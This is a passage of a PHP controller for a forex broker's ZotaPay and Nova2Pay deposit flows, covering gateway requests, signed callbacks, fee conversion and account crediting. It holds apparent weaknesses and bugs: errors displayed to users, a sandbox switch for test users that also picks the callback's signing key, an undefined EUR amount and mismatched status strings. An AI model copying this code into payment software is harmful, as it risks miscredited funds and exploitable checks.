                $amount = $this->input->post('amount', true);
                $currency = $this->input->post('currency', true);
                $accountNumber = $this->session->userdata('account_number');
                $itemId = strtolower($currency).uniqid();

                if ($this->input->post('payment_type', true) == 'CC') {
                    $compensation = 0;
                    if($currency == 'EUR' && IPLoc::isEuropeanCountryByCode($profile['country'])){
                        //$compensation = ceil((($amount * 0.03) * 100) / 100);

                        $compensation = FXPP::roundno($amount * 0.03, 2); 
                        $amount = $amount + $compensation;

                    }
                   
                    $this->zotapay->setAccessType(1); // 0 - test 1 -live
                } else {
                    $test_users = unserialize(TEST_USERS_DEPOSIT);
                    if (in_array($userId, $test_users)) {
                        $this->zotapay->setAccessType(0); // 0 - test 1 -live
                    } else {
                        $this->zotapay->setAccessType(1); // 0 - test 1 -live
                    }

                    
                }

               

              

                $additional_bonus = $this->validateAdditionalBonus($_GET['addBonus']);

                $insertData = [
                    'amount' => $amount,
                    'order_id' => $itemId,
                    'payment_currency' => $currency,
                    'bonus' => $this->input->get('bonus', true),
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $userId,
                    'additional_tenp_bonus' => $additional_bonus,
                    'payment_type' => $this->input->post('payment_type', true) == 'CC' ? 1 : 0,
                    'card_type' => $this->input->post('card_type', true) == 'VISA' ? 1 : 0,
                    'extra_compensation' => $compensation,
                ];

                $this->general_model->insertmy('zotapay', $insertData);

                $params = [
                    'merchantOrderID' => $itemId,
                    'merchantOrderDesc' => 'Deposit ZotaPay ['.$accountNumber.']',
                    'orderAmount' => $amount,
                    'orderCurrency' => $currency,
                    'customerFirstName' => $this->input->post('first_name', true),
                    'customerLastName' => $this->input->post('last_name', true),
                    'customerAddress' => $this->input->post('address', true),
                    'customerCountryCode' => $profile['country'],
                    'customerCity' => $this->input->post('city', true),
                    'customerState' => $this->input->post('state', true),
                    'customerZipCode' => $this->input->post('zip', true),
                    'customerPhone' => $this->input->post('phone_number', true),
                    'customerEmail' => strtolower($this->session->userdata('email')),
                    'customerIP' => $this->input->ip_address(),
                ];
                


                $paymentRes = $this->zotapay->paymentRequest($params);


                if ($paymentRes['code'] == 200) {
                    $updateData = ['tnx_id' => $paymentRes['data']['orderID']];
                    $this->general_model->updatemy('zotapay', 'order_id', $paymentRes['data']['merchantOrderID'], $updateData);

                    if (isset($paymentRes['data']['depositUrl'])) {
                        redirect($paymentRes['data']['depositUrl']); //redirect to the payment gateway page.
                    }


                    /* $orderRequest = array(
                        'merchantID' => 'FOREXMART',
                        'merchantOrderID' => $paymentRes['data']['merchantOrderID'],
                        'orderID' => $paymentRes['data']['orderID'],
                        'timestamp' => strtotime(FXPP::getCurrentDateTime()),
                    );

                   if(IPloc::IPOnlyForVenus() || $_SERVER['REMOTE_ADDR']=='195.201.40.47') {
                       /// if ($params['orderCurrency'] == 'USD' || $params['orderCurrency'] == 'EUR') { // card option only
                            while (true) {
                                sleep(10); // sleep for 10 sec

                                $decodeOrder = $this->zotapay->orderStatusRequest($orderRequest);

                                $insertData = ['log' => serialize($decodeOrder), 'ip' => $this->input->ip_address(), 'type' => 'ZOTAPAY'];
                                $this->general_model->insertmy('fasapay_log', $insertData);

                                $orderResCode = $decodeOrder['code'];
                                $orderResStatus = $decodeOrder['data']['status'];

                                if ($orderResCode == 'APPROVED' || $orderResCode == 'DECLINED') {
                                    break;
                                } else {
                                    if ($orderResStatus == 'PENDING') {
                                        if ($decodeOrder['data']['extraData']['pending3dSecure']) {
                                            if (isset($decodeOrder['data']['extraData']['url3dSecure'])) {
                                                redirect($decodeOrder['data']['extraData']['url3dSecure ']); //redirect to url 3d secure
                                            }
                                        }
                                    }
                                }
                            }

                      //  }


                    }*/

                } else {
                    $this->general_model->updatemy('zotapay', 'order_id', $insertData['order_id'], ['note' => $paymentRes['message']]);
                
                    $data['apiMsg'] = $paymentRes['message'];
                }
            }
            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $data['metadata_description'] = 'Provide the necessary information to deposit via Zotapay. Request is processed within 24 hours.';

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

            if ($data['type'] == 'cc') {
                $data['allow_country'] = true;


                if (FXPP::cardUsers()) {

                $data['card_numbers'] = [];
                $card_document_status = false;
    
                $cardNumberList = $this->deposit_model->getCardNumberByStatus($accountNumber, 2);
    
                if ($cardNumberList) {
                    $card_document_status = true;
                    foreach ($cardNumberList as $card_key => $card_data) {
                        if ($card_data['status'] == 1) {
                            $data['card_numbers'][] = $card_data['card_number'];
                        }
                    }
                }
    
                if (isset($_GET['cd']) && strlen($_GET['cd']) > 5) {
                    $data['card_numbers'][] = FXPP::decode($_GET['cd']);
                } else {
                    if (!$card_document_status) {
                        redirect('deposit/card-documents?p=zp');
                    }
                }

                
                $data['field_value'] = $field_value;

    
            }

            
                    $data['hasState'] = false;
                    if(in_array($profile['country'], array('AU','CA','US'))) {
                        $data['hasState'] = true;
                        $this->load->library('ZotaPay');
                        $stateList = $this->zotapay->getStateCode($profile['country']);
                
                    $data['state_option'] = '';
                    foreach ($stateList as $key => $val) {
                        $data['state_option'] .= '<option '.$selected." value='".$key."'>".$val.'</option>';
                    }
                    }
                
                $view = 'deposits/zotapay_creditcard';

            }else{

                $view = 'deposits/zotapay';

            }
         
            $data['innertab']="zotapay";
           
            $this->template->title('ForexMart | Deposit - ZotaPay')
                ->set_layout('internal/main')
                ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
                ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build($view, $data);
        } else {
            redirect('signout');
        }
    }

    public function zotapay_cc(){
        $data['type'] = 'cc';
        $view = 'deposits/zotapay_creditcard';
        $this->template->title('ForexMart | Deposit - ZotaPay')
            ->set_layout('internal/main')
            ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
            ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
            ->build($view, $data);

    }

    public function zotapay_return()
    {
        $status = $this->input->get('status');
        $mOrderId = $this->input->get('merchantOrderID');
        $dataRes = $this->general_model->showssingle($table = 'zotapay', $id = 'order_id', $field = $mOrderId, $select = 'payment_currency');
           
    
        if ($status === 'APPROVED') {
            $message = 'Transaction Successful.';
        } elseif ($status === 'DECLINED.') {
            $message = 'Transaction Declined.';
        } elseif ($status === 'ERROR.') {
            $message = 'Transaction Failed.';
        } elseif ($status == 'PENDING') {
            $message = 'Transaction In-process.';
        } else {
            $message = 'Transaction Failed.';
        }
        $this->session->set_flashdata('zotapay_transaction', $message);
        if($dataRes['payment_currency'] == 'EUR' || $dataRes['payment_currency'] == 'USD'){

         redirect('deposit/zotapay?type=cc');
        }else{
            
         redirect('deposit/zotapay');
        }
       
    }

    public function zotapay_callback()
    {
        $zotapayData = json_decode(file_get_contents('php://input'), true);

        $insertData = ['log' => serialize($zotapayData), 'ip' => $this->input->ip_address(), 'type' => 'ZOTAPAY'];
        $this->general_model->insertmy('fasapay_log', $insertData);

        $condition = [  // check if tnx id exist in zotapay table
            'order_id' => $zotapayData['merchantOrderID'],
            'status' => 1, // processed
        ];

        if ($this->general_model->whereCondition('zotapay', $condition)) {
            return false;
        }

        if ($row = $this->general_model->where('zotapay', ['order_id' => $zotapayData['merchantOrderID'], 'status' => 0])) {
            $invData = $row->row_array();
            $this->load->library('ZotaPay');

            if ($invData['payment_type'] == 1) {
                $this->zotapay->setAccessType(1); //  1 -live
            } else {
                $test_users = unserialize(TEST_USERS_DEPOSIT);
                if (in_array($invData['user_id'], $test_users)) {
                    $this->zotapay->setAccessType(0); // 0 - test 1 -live
                } else {
                    $this->zotapay->setAccessType(1); // 0 - test 1 -live
                }
            }

            if (in_array($zotapayData['currency'], ['EUR','USD'])) {
                $paymentType = 'ZOTAPAY_CARD';
            } else {
                $paymentType = 'ZOTAPAY_'.$zotapayData['currency'];
            }

            $paymentMethod = $zotapayData['extraData']['paymentMethod'];
            $status = $zotapayData['status'];

            $secretkey = $this->zotapay->getMerchantSecretKey();
            $zotapaySha256 = $zotapayData['signature'];
            $concatData = $zotapayData['endpointID'].$zotapayData['orderID'].$zotapayData['merchantOrderID'].$zotapayData['status'].$zotapayData['amount'].$zotapayData['customerEmail'].$secretkey;
            $genSha256 = hash('sha256', $concatData);

            if ($status == 'APPROVED') {// accept approve status only
                    if ($genSha256 == $zotapaySha256) { // validate
                    // if (floatval($invData['amount']) == floatval($zotapayData['amount'])) {
                    $paidAmount = ($zotapayData['amount']);
                    if($zotapayData['currency'] == 'EUR' && $invData['extra_compensation'] > 0){
                        $paidAmount = $paidAmount - $invData['extra_compensation']; 
                     }

                        $updateData = ['status' => 1]; // update the status in  cardpay table
                        $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);

                        $accData = $this->general_model->whereConditionQuery($invData['user_id']);

                        

                        //wallet currency to base currency EUR

                         if($zotapayData['currency'] == 'EUR' || $zotapayData['currency'] == 'USD'){ //card
                            $fixedFee = 0.7; //EUR
                            $depositFee = 0.065; //6.5%
                         }else{
                            $fixedFee = 0.3; //EUR
                            $depositFee = 0.03; //3%
                         }


                        $compensationAmountEUR = 0;
                         if($zotapayData['currency'] != 'EUR'){ //convert  if payment currecy is not in EUR
                            $amountEUR = FXPP::roundno($this->get_convert_amount($zotapayData['currency'], $paidAmount,'EUR'), 2); //amount in EUR

                         }else{
                             if($invData['extra_compensation'] > 0){
                                $compensationAmountEUR = $invData['extra_compensation']; //3%
                             }
                           
                         }
                            $totalFeeEUR = ($amountEUR * $depositFee) + $fixedFee;

                           
                        if($accData['currency'] != 'EUR'){ //convert  if account currency is not  EUR
                            $totalFee = FXPP::roundno($this->get_convert_amount('EUR', $totalFeeEUR, $accData['currency']), 2); //amount in account currency
                            $amount = FXPP::roundno($this->get_convert_amount('EUR', $amountEUR, $accData['currency']), 2); //amount in account currency
                            $compensationAmount = FXPP::roundno($this->get_convert_amount('EUR', $compensationAmountEUR, $accData['currency']), 2);
                        }else{

                            $totalFee = FXPP::roundno($totalFeeEUR, 2); //amount in account currency
                            $amount = FXPP::roundno($amountEUR, 2); //amount in account currency
                            $compensationAmount = FXPP::roundno($compensationAmountEUR, 2);

                        }

                        

                       
                        $isMicro = $this->account_model->isMicro($invData['user_id']);
                        if ($isMicro) {
                            $amount *= 100;
                            $totalFee *= 100;
                            $compensationAmount *= 100;
                        }

                        $amount -= $totalFee;
                        $conv_amount = $amount;
                        $conv_amount_fee = $totalFee;
                        $conv_amount_usd = $this->get_convert_amount($accData['currency'], $amount);
                        $conv_amount_fee_usd = $this->get_convert_amount($accData['currency'], $totalFee);
                        $conv_amount_compensation_usd = $this->get_convert_amount($accData['currency'], $compensationAmount);

                        $insertDepositFailed = [
                        'transaction_id	' => $zotapayData['orderID'],
                        'status	' => 0,
                        'amount	' => $amount,
                        'currency' => $zotapayData['currency'],
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                        'transaction_type' => $paymentType,
                        'fee' => $totalFee,
                        'isFailed' => 0,
                        'type' => 'deposit-'.$isMicro.'-'.$invData['bonus'],
                    ];

                        $data = [
                        'transaction_id' => $zotapayData['orderID'],
                        'reference_id' => $zotapayData['merchantOrderID'],
                        'status' => 2,
                        'amount' => $amount,
                        'currency' => $zotapayData['currency'],
                        'user_id' => $invData['user_id'],
                        'payment_date' => date('Y-m-d H:i:s', strtotime('now')),
                        'note' => 'Zotapay deposit',
                        'transaction_type' => $paymentType,
                        'conv_amount' => $conv_amount_usd,
                    ];

                        if ($totalFee > 0) {
                            $data_fee = [
                            'transaction_id' => $zotapayData['orderID'],
                            'reference_id' => $zotapayData['merchantOrderID'],
                            'status' => 2,
                            'amount' => $totalFee,
                            'currency' => $zotapayData['currency'],
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime('now')),
                            'note' => 'Zotapay deposit',
                            'transaction_type' => $paymentType,
                            'conv_amount' => $conv_amount_fee_usd,
                        ];
                        }

                        if ($compensationAmount > 0) {
                            $data_compensation = [
                            'transaction_id' => $zotapayData['orderID'],
                            'reference_id' => $zotapayData['merchantOrderID'],
                            'status' => 2,
                            'amount' => $compensationAmount,
                            'currency' => $zotapayData['currency'],
                            'user_id' => $invData['user_id'],
                            'payment_date' => date('Y-m-d H:i:s', strtotime('now')),
                            'note' => 'Zotapay deposit',
                            'transaction_type' => $paymentType,
                            'conv_amount' => $conv_amount_compensation_usd,
                        ];
                        }

                        $config = [
                        'server' => 'live_new',
                    ];


                        $account_number = $accData['account_number'];

                      
                        $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount, $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                        $requestResult = $WebServiceNew['requestResult'];
                        $ticket = $WebServiceNew['ticket'];
                   

                        if ($requestResult === 'RET_OK') {
                            $data['mt_ticket'] = $ticket;

                            // Back Agent of Client
                            //FXPP::BackAgentOfAccount($account_number); // for NDB

                            
                        } else {
                            $insertDepositFailed['comment'] = $requestResult;
                            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                        }

                        if ($totalFee > 0) {

                            $account_number = $accData['account_number'];

                           
                            $WebServiceNew = FXPP::DepositRealFund($account_number, $conv_amount_fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];
                       

                            if ($requestResult === 'RET_OK') {
                                $data_fee['mt_ticket'] = $ticket;


                            } else {
                                $insertDepositFailed['comment'] = $requestResult;
                                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                            }
                        }

                        // zotapay extra compensation

                        if($compensationAmount > 0){

                            $WebServiceNew = FXPP::DepositRealFund($account_number, $compensationAmount, 'CONVERSION_RATE_COMPENSATION');
                            $requestResult = $WebServiceNew['requestResult'];
                            $ticket = $WebServiceNew['ticket'];

                        }

                        $this->SetAccountAgentPotentialFund($account_number);

                        $deposit_id = $this->deposit_model->insertPayment($data);
                        if ($totalFee > 0) {
                            $this->deposit_model->insertPayment($data_fee);
                        }
                        if ($compensationAmount > 0) {
                            $this->deposit_model->insertPayment($data_compensation);
                        }

                        $updateData = ['status' => 1, 'tnx_id' => $zotapayData['orderID']];
                        $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);

                        /**  Use original amount for Cent accounts**/
                        $isMicro = $this->account_model->isMicro($invData['user_id']);
                        $processed_amount = floatval($conv_amount_usd) + floatval($conv_amount_fee_usd) + floatval($conv_amount_compensation_usd);
                        if ($isMicro) {
                            $processed_amount /= 100;
                        }
                        /* End **/
                        /* Send successful email deposit to auto-reports **/
                        if ($paymentMethod == 'MASTERCARD') {

                            $reportPayment = 'ZOTAPAY_MASTERCARD';

                        }else if($paymentMethod == 'VISA'){
                            $reportPayment = 'ZOTAPAY_VISA';
                        } else {
                            $reportPayment = $paymentType;
                        }

                        $this->sendEmailAfterSuccessDeposit($reportPayment, $processed_amount, $account_number, $invData['user_id'], $this->comment_type['deposit'].$this->comment_transaction_type[$paymentType].$data['transaction_id']);
                        /* End **/


                        /* if (IPLoc::APIUpgradeDevIP()) {
                             FXPP::updateAccountTradingStatusV2($account_number, $invData['user_id']); // for pro accounts
                         } else {*/
                        FXPP::updateAccountTradingStatus($account_number, $invData['user_id']); // for pro accounts
                        //}

                        /* ========================================== Welcome bonus================================================ **/
                     
                         $bonusAmt = $data['amount'] + $data_fee['amount'] + $data_compensation['amount'];
                        self::applyDepositBonus($invData['user_id'], $account_number, $bonusAmt, $paymentType, $invData['bonus'], $data['transaction_id'], false);

                        if ($invData['additional_tenp_bonus'] == 1) {
                            self::applyDepositBonus($invData['user_id'], $account_number, $bonusAmt, $paymentType, 'tenpb', $data['transaction_id'], true);
                        }

                        /**=========================================== Welcome bonus end ====================================================**/



                    //}
                    } else {
                        $updateData = ['status' => 2, 'tnx_id' => $zotapayData['orderID'], 'note' => 'sha256 do not match.'];
                        $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);
                    }
            } elseif ($status == 'PROCESSING') { // processing
                $updateData = ['status' => 0, 'tnx_id' => $zotapayData['orderID'], 'note' => 'PROCESSING STATUS - '.$status];
                $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);
            } elseif ($status == 'PENDING') { // pending
                if ($zotapayData['extraData']['pending3dSecure']) {
                    redirect($zotapayData['extraData']['url3dSecure']);
                }

                $updateData = ['status' => 0, 'tnx_id' => $zotapayData['orderID'], 'note' => 'PENDING status - '.$status];
                $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);
            } elseif ($status == 'ERROR') {
                $updateData = ['status' => 2, 'tnx_id' => $zotapayData['orderID'], 'note' => 'status - '.$status.'-'.$zotapayData['errorMessage']];
                $this->session->set_flashdata('zotapay_transaction', 'Transaction Failed.');
                redirect('deposit/zotapay');
            } elseif ($status == 'DECLINED') {
                $updateData = ['status' => 2, 'tnx_id' => $zotapayData['orderID'], 'note' => 'status - '.$status.'-'.$zotapayData['errorMessage']];
                $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);
                $this->session->set_flashdata('zotapay_transaction', 'Transaction Declined.');
                redirect('deposit/zotapay');
            } else { //UNKNOWN,'FILTERED'
                // declined
                $updateData = ['status' => 2, 'tnx_id' => $zotapayData['orderID'], 'note' => 'status - '.$status.'-'.$zotapayData['errorMessage']];
                $this->general_model->updatemy('zotapay', 'order_id', $zotapayData['merchantOrderID'], $updateData);
            }
        }
    }

    public function requestZPBanks()
    {
        $currency = $this->input->post('currency', true);

        $methodList = FXPP::getZPBanks($currency);
        $selectOption = '';
        foreach ($methodList as $key => $value) {
            $selectOption = $selectOption."<option value='".$key."'>".$value.'</option>';
        }
        $this->output->set_content_type('application/json')->set_output(json_encode(['option' => $selectOption]));
    }

    public function deposit_finance_v2()
    {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
        $this->lang->load('depositwithdraw');
        $this->lang->load('sidebar');

        if ($this->session->userdata('logged')) {
            //**my_account/index /
            $_SESSION['redirect'] = null;
            //**End**//

            // if (!IPLoc::Office()) {
            //     FXPP::LoginTypeRestriction();
            // }

            $user_id = $this->session->userdata('user_id');

            $mtas2 = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = 'mt_currency_base');

            $data['title_page'] = lang('sb_li_2');
            $data['active_tab'] = 'finance';
            $data['active_sub_tab'] = 'deposit';
            $data['metadata_description'] = lang('dep_dsc');
            $data['metadata_keyword'] = lang('dep_kew');

            $nodepositbonus = $this->g_m->showssingle2('users', 'id', $user_id, 'nodepositbonus,created,createdforadvertising');
            $first_bonus_acquired = $this->deposit_model->getFirstPercentBonusAcquired($user_id);

            $data['loginType'] = $this->session->userdata('login_type');
            $ForMarStaAcc = FXPP::get_standardgroup_v2($_SESSION['account_number']);
            if ($ForMarStaAcc) {
                $data['IsStandardAccount'] = true;
            } else {
                $data['IsStandardAccount'] = false;
            }

            $data['isSupporter'] = false;
//                if ($account = $this->g_m->whereCondition('all_accounts', array('user_id' => $user_id))) {
            if ($account = $this->general_model->whereConditionQuery($user_id)) {
                $data['isSupporter'] = FXPP::isSupporterAccounts($account['account_number']);
            }

            $bonus_selection = 'hdb';
            if ($nodepositbonus['nodepositbonus'] == 1) {
                $bonus_selection = 'ndb';
            } else {
                if ($first_bonus_acquired) {
                    if ($first_bonus_acquired['fiftypercentbonus'] == 1) {
                        $bonus_selection = 'fpb';
                    } elseif ($first_bonus_acquired['twentypercentbonus'] == 1) {
                        $bonus_selection = 'twpb';
                    } elseif ($first_bonus_acquired['thirtypercentbonus'] == 1) {
                        $bonus_selection = 'tpb';
                    } elseif ($first_bonus_acquired['hundredpercentbonus'] == 1) {
                        $bonus_selection = 'hpb';
                    } elseif ($first_bonus_acquired['fiftypercentlimitedbonus'] == 1) {
                        $bonus_selection = 'hpb';
                    } elseif ($first_bonus_acquired['tenpercentbonus'] == 1) {
                        $bonus_selection = 'tenpb';
                    }
                }
            }

            /* FXPP-6333 */
            $isMicro = $this->account_model->isMicro($user_id);
            if ($isMicro) {
                $data['micro'] = 1;
            }
            /* FXPP-6333 */
            $data['isNewAccountType'] = FXPP::fmGroupType($account['account_number']);
            $data['login_type'] = $this->session->userdata('login_type');
            $data['bonus_selection'] = $bonus_selection;
            $data['modal_bonus_alert'] = $this->load->ext_view('modal', 'bonus_alert', $data['data'], true);
//            if(IPLoc::Office()){
            $data['acc_status'] = $this->general_model->showssingle($table = 'users', $id = 'id', $field = $this->session->userdata('user_id'), $select = 'accountstatus');
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));
            if ($data['count_status']) {
                $data['error_msg'] = 'You are allowed to deposit up to 2000 EUR or equivalent converted amount in other currency starting from registration date, '.
                    date('F d, Y', strtotime(str_replace('-', '', $data['count_status']['created']))).' until '.
                    date('F d, Y', strtotime(str_replace('-', '', $data['count_status']['count'])))
                    .'. ';
            }
            $data['total_balance'] = ''; // $this->getBalance($mtas2['mt_currency_base']);
            $data['cur_base'] = $mtas2['mt_currency_base'];
//            }

            $image = $this->user_model->getUserProfileByUserId($user_id)['image'];
            $this->session->set_userdata(['image' => $image]);

            $css = $this->template->Css();
            $this->template->title(lang('dep_tit'))
                ->append_metadata_css("
                        <link rel='stylesheet' href='".$css."/finance-style.css'>
                        <link rel='stylesheet' href='".$css."/finance-style-v2.css'>
                ")
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/deposit_finance_index', $data);
        } else {
            // redirect('signout');
            $_SESSION['redirect'] = $this->config->item('domain-my').$_SERVER['REQUEST_URI'];
            $lan = FXPP::html_url();
            if ($lan == 'en' || $lan == 'EN') {
                $lan = '';
            }
            redirect(''.$lan.'/client/signin');
        }
    }

    public function exchange_currency()
    {
        if ($this->input->is_ajax_request() && $this->session->userdata('logged')) {
            $currencyFrom = $this->input->post('currency_from', true);
            $currencyTo = $this->input->post('currency_to', true);
            $amount = $this->input->post('amount', true);

            switch ($currencyTo) {
                case 'BRL':
                case 'NGN':
                case 'UGX':
                case 'KES':
                case 'GHS':
                    $rate = FXPP::freeCurrencyConverter($currencyFrom, $currencyTo, $amount); //amount in account currency
                   break;
                case 'LAK':
                case 'MMK':
                case 'KHR':
                case 'ZAR':
                case 'THB':                    
                    $rate = FXPP::freeCurrencyConverter($currencyFrom, $currencyTo, $amount); //amount in account currency
                   break;
                default:
                    $rate = $this->get_convert_amount($currencyFrom, $amount, $currencyTo); //amount in account currency
                    break;
            }

            
//             if($rate=="0") {
//                $rate = $this->get_convert_amount($currencyFrom, $amount, $currencyTo); //amount in account currency
//             }
            
            
            $success = false;
            if ($rate > 0) {
                $success = true;
            }
            
            
            
            $this->output->set_content_type('application/json')->set_output(json_encode(['success' => $success, 'rate' => ceil($rate)]));
        }
    }

    public function manualSendReports()
    {
       exit();
        $rows = $this->g_m->depositReport();
        foreach ($rows as $row) {
            $transaction_comment = $this->comment_type['deposit'].$this->comment_transaction_type[$row['transaction_type']].$row['transaction_id'];
            if ($row['transaction_type'] == 'ZOTAPAY_CARD') {

                $reportPayment = 'ZOTAPAY_MASTERCARD';

            }else{
                $reportPayment = $row['transaction_type'];
            }

            $this->sendEmailAfterSuccessDepositManual($row['payment_date'],$reportPayment, $row['amount'], $row['account_number'], $row['user_id'], $transaction_comment);

            //echo $row['account_number'].'-'.$transaction_comment;
            echo '<br>';
            //  exit();
        }
    }



    public function nova2pay()
    {
        if ($this->session->userdata('logged')) {

            if(!FXPP::isNova2PayMentAvailable()){
                show_404('accessing');
            }

            
            // if($_SERVER['REMOTE_ADDR'] == '95.217.153.171' || IPLoc::IPOnlyForVenus() || $this->session->userdata('account_number') ==  58067696 || $this->session->userdata('account_number') ==  58031116){
              
            // }else{
            //     show_404('accessing');
            // }

       




            $data['amount'] = $this->input->post_get('amount1', true);

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'from_card_number' => $this->input->post('card_number', true),
                    'amount' => $this->input->post('amount', true),
                ];
            }

            $data['bounusfiled'] = $this->input->get('bonus', true);
            $userId = $this->session->userdata('user_id');
            $currency =  $this->input->post('currency', true);
            $cardNumber = $this->input->post('card_number', true);
            $accountNumber = $this->session->userdata('account_number');
            $walletCurrency = $currency .'-'.'NP';
            if(FXPP::cardUsers()) {
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|validate_transaction[$cardNumber]|non_usd_min_amt_validate_zp[$walletCurrency]");
          
            }else{
                $this->form_validation->set_rules('amount', 'Amount', "trim|required|non_usd_min_amt_validate_zp[$walletCurrency]");
          
            }
            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean'); 
    
           

            $data['error_msg'] = $this->updated_deposit_validation($userId);

            if ($this->form_validation->run() && !$data['error_msg']) {

                $this->load->library('NovaPay');
             
                // $test_users = unserialize(TEST_USERS_DEPOSIT);
                // if (in_array($userId, $test_users)) {
                //     $this->novapay->setAccessType(0); // 0 - test 1 -live
                // } else {

                    if($userId == 406979){
                        $this->novapay->setAccessType(0); // 0 - test 1 -live
                    }else{
                        $this->novapay->setAccessType(1); // 0 - test 1 -live
                    }
                    
                //}
                


             
                $oid = strtolower($currency).uniqid();
                $amount = $this->input->post('amount', true);
                $date = new DateTime();
                $tid = $date->getTimestamp();

                $additional_bonus = $this->validateAdditionalBonus($_GET['addBonus']);
               
              
                $insertData = [
                    'amount' => $amount,
                    'tnx_id' => $tid,
                    'order_id' => $oid,
                    'currency' => $currency,
                    'status' => 0,
                    'bonus' => $this->input->get('bonus', true),
                    'create_date' => date('Y-m-d h:i:s'),
                    'user_id' => $userId,
                    'additional_tenp_bonus' => $additional_bonus,
                    'card_number' => $cardNumber,
                ];


                

                $this->general_model->insertmy('nova2pay', $insertData);
              

                $params = [
                    'tid' => $tid,
                    'oid' => $oid,
                    'acc' => $accountNumber,
                    'amt' => $amount,                 
                    'cur' => $currency,
                ];
                $res = $this->novapay->checkoutRequest($params);
                exit();


               
            }
            if (FXPP::cardUsers()) {

                $data['card_numbers'] = [];
                $card_document_status = false;

                $cardNumberList = $this->deposit_model->getCardNumberByStatus($accountNumber, 2);

                if ($cardNumberList) {
                    $card_document_status = true;
                    foreach ($cardNumberList as $card_key => $card_data) {
                        if ($card_data['status'] == 1) {
                            $data['card_numbers'][] = $card_data['card_number'];
                        }
                    }
                }

                if (isset($_GET['cd']) && strlen($_GET['cd']) > 5) {
                    $data['card_numbers'][] = FXPP::decode($_GET['cd']);
                } else {
                    if (!$card_document_status) {
                        redirect('deposit/card-documents?p=np');
                    }
                }

                
              $data['field_value'] = $field_value;


           }


            $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

            $data['metadata_description'] = 'Provide the necessary information to deposit via Nova2Pay. Request is processed within 24 hours.';

            $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
            $data['account'] = $account;
            $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);
            $data['innertab']="nova2pay";
            
            $view = 'deposits/nova2pay';
            $this->template->title('ForexMart | Deposit - Nova2Pay')
                ->set_layout('internal/main')
                ->append_metadata_css("<link rel='stylesheet' href='".$this->template->Css()."loaders.css'>")
                ->append_metadata_js("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                ->build($view, $data);
        } else {
            redirect('signout');
        }
    }

    public function nova2pay_return()
    {
       $status = $this->input->get('tradeStatus');
       if($status == 'Declined'){
         $msg = '1';
       }else{
         $msg = '2';
       }
        
        $this->session->set_flashdata('nova2pay_status', $msg);       
         redirect('deposit/nova2pay');
      
    }

    
    public function nova2pay_notify()
    {
//

        // $json = 'a:11:{s:9:"accountId";s:8:"70030701";s:10:"merTradeId";s:10:"1620657566";s:6:"amount";s:4:"3.00";s:7:"orderId";s:22:"OD20210510222454011715";s:10:"event_code";s:4:"Sale";s:11:"tradeStatus";s:8:"Approved";s:15:"merDescribeName";s:13:"TEST_DES_MER1";s:8:"currency";s:3:"USD";s:7:"tf_sign";s:344:"6171654777456E496D505648706549506A6759702F506B7A6675374D6B4F567337493876337738706E5846574C6E624F764352646C4279336B79767931472F727072496958716451596A726F3472514A6B3635765A6338663472535A582B414E636F2B647767773738354877764F454F6D3465686A763167674C694C576D547646526E45452F776A52694B5A686536646775514F7A33683166637354366277544970764E4D7847675A704D3D";s:7:"tradeId";s:22:"TD20210510222454010927";s:10:"merOrderId";s:16:"usd6099459ef29aa";}';
       // $nova2payData = unserialize($json);


       $nova2payData = $_POST;

       $insertData = ['log' => serialize($nova2payData), 'ip' => $this->input->ip_address(), 'type' => 'NOVA2PAY'];
       $this->general_model->insertmy('fasapay_log', $insertData);


        if ($row = $this->general_model->where('nova2pay', ['order_id' => $nova2payData['merOrderId'], 'status' => 0])) {
            $invData = $row->row_array();

            $this->load->library('NovaPay');
           // $test_users = unserialize(TEST_USERS_DEPOSIT);
            // if (in_array($invData['user_id'], $test_users)) {
            //     $this->novapay->setAccessType(0); // 0 - test 1 -live
            // } else {
                if($invData['user_id'] == 406979){
                    $this->novapay->setAccessType(0); // 0 - test 1 -live
                }else{
                    $this->novapay->setAccessType(1); // 0 - test 1 -live
                }
            //}
            $paymentType = 'NOVA2PAY';
            $isVerified = $this->novapay->verifySign($nova2payData);
            
            $status = $nova2payData['tradeStatus'];

            if ($status == 'Approved') {// accept approve status only
                    if ($isVerified) { // validate
                    // if (floatval($nova2payData['amount']) == floatval($nova2payData['amount'])) {
                        $paidAmount = ($nova2payData['amount']);

